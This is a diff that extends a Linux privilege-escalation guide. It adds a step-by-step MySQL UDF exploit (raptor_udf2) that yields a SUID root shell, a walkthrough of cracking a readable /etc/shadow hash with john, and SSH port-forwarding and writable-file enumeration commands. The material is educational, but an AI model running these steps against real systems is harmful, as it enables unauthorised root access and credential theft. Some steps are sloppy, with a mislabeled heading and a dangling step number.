@@ -213,31 +213,102 @@ Also, check if **any compiler is installed**. This is useful if you need to use 
 (dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
 ```
 
-### Vulnerable Software Installed
+### Service & softwares Exploits
+
+Services are simply programs that run in the background,
+accepting input or performing regular tasks.
+If vulnerable services are running as root, exploiting them can
+lead to command execution as root.
+Service exploits can be found using Searchsploit, Google, and
+GitHub, just like with Kernel exploits.
 
 Check for the **version of the installed packages and services**. Maybe there is some old Nagios version (for example) that could be exploited for escalating privileges…\
-It is recommended to check manually the version of the more suspicious installed software.
+
+ run the enumeration scripts ( ex: linpeas, ) to check Software Information 
+ using ***lenpeas***
+ > `[+] MySQL connection using root/NOPASS ................. Yes -> linleas`
+ 
+>using ***lse.sh*** ( linux smart enumeration) script :
+`[!] sof010 Can we connect to MySQL as root without password?............... yes!`
+
+also It is recommended to check manually the version of the more suspicious installed software.
+```bash
+dpkg -l
+dpkg -l | grep <program> #Debian
+rpm -qa #Centos
+#enumerate the processes running as root
+ps aux | grep "^root”
+<program> --version
+<program> -v
+```
+example:
+1. Enumerate the processes running as root:
+```
+ps aux | grep "^root”
+...
+root /sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=root ...
+```
+2. Enumerate the version of mysqld:
+`mysqld --version  -> mysqld Ver 5.1.73`
+3. search for any priv esc  exploit for this version and find that MySQL has the ability to install User Defined Functions (UDF) which run via shared objects
+`searchsploit mysql 5`
+>MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library 
+
+4. Follow the instructions in this exploit to compile and install a UDF which executes system commands: https://www.exploit-db.com/exploits/1518
+Note: some commands may require slight modification.
 
 ```bash
-dpkg -l #Debian
-rpm -qa #Centos
+pwd -> /tmp
+gcc -g -c 1518.c -fPIC
+gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so 1518.o -lc
+ls -> /tmp/raptor_udf2.so
+
+mysql -u root 
+
+use mysql;
+
+create table foo(line blob);
+
+insert into foo values(load_file('/tmp/raptor_udf2.so'));
+
+select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+
+create function do_system returns integer soname 'raptor_udf2.so';
+
+select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
+exit
+# excute the suid rootbash command
+/tmp/rootbash -p
+> id
+uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),
 ```
 
+4. Once the UDF is installed, run the following command in the MySQL shell:
+5.
 If you have SSH access to the machine you could also use **openVAS** to check for outdated and vulnerable software installed inside the machine.
-
 {% hint style="info" %}
 _Note that these commands will show a lot of information that will mostly be useless, therefore it's recommended some applications like OpenVAS or similar that will check if any installed software version is vulnerable to known exploits_
 {% endhint %}
 
+
+In some instances, a root process may be bound to an internal port,
+through which it communicates.
+If for some reason, an exploit cannot run locally on the target machine,
+the port can be forwarded using SSH to your local machine:
+`$ ssh -R <local-port>:127.0.0.1:<target-port> <username>@<local-machine>`
+>The exploit code can now be run on your local machine at whichever port you chose.
 ## Processes
 
 Take a look at **what processes** are being executed and check if any process has **more privileges than it should** (maybe a tomcat being executed by root?)
 
 ```bash
 ps aux
+#enumerate the processes running as root
+ps aux | grep "^root” 
 ps -ef
 top -n 1
 ```
+
 
 Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
 Also **check your privileges over the processes binaries**, maybe you can overwrite someone.
@@ -1382,10 +1453,16 @@ If you find that Forward Agent is configured in an environment read the followin
 [ssh-forward-agent-exploitation.md](ssh-forward-agent-exploitation.md)
 {% endcontent-ref %}
 
-## Interesting Files
+## Weak File Permissions
 
+***Useful Commands***
+Find all writable files in /etc:
+`$ find /etc -maxdepth 1 -writable -type f`
+Find all readable files in /etc:
+`$ find /etc -maxdepth 1 -readable -type f`
+Find all directories which can be written to:
+`$ find / -executable -writable -type d 2> /dev/null`
 ### Profiles files
-
 The file `/etc/profile` and the files under `/etc/profile.d/` are **scripts that are executed when a user runs a new shell**. Therefore, if you can **write or modify any of them you can escalate privileges**.
 
 ```bash
@@ -1409,6 +1486,45 @@ In some occasions you can find **password hashes** inside the `/etc/passwd` (or 
 
 ```bash
 grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
+```
+
+### readable /etc/passwd
+
+The /etc/shadow file contains user password hashes, and by default is not readable by any user except for root. If we are able to read the contents of the /etc/shadow file, we might be able to crack the root user’s password hash. If we are able to modify the /etc/shadow file, we can replace the root user’s password hash with one we know.
+
+1. Check the permissions of the /etc/shadow file:
+```bash
+$ ls -l /etc/shadow
+-rw-r—rw- 1 root shadow 810 May 13
+2017 /etc/shadow
+```
+2. Extract the root user’s password hash:
+```bash
+$ head -n 1 /etc/shadow
+root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
+```
+3. Save the password hash in a file (e.g. hash.txt):
+```bash
+$ echo '$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVl
+aXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0' > hash.txt'
+```
+4. Crack the password hash using john:
+```bash
+$ john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.t
+xt hash.txt
+...
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE
+2 2x])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+password123
+(?)
+```
+5. Use the su command to switch to the root user, entering the password we cracked when prompted:
+```bash
+$ su
+Password:
+root@debian:/# id
+uid=0(root) gid=0(root) groups=0(root)
 ```
 
 ### Writable /etc/passwd
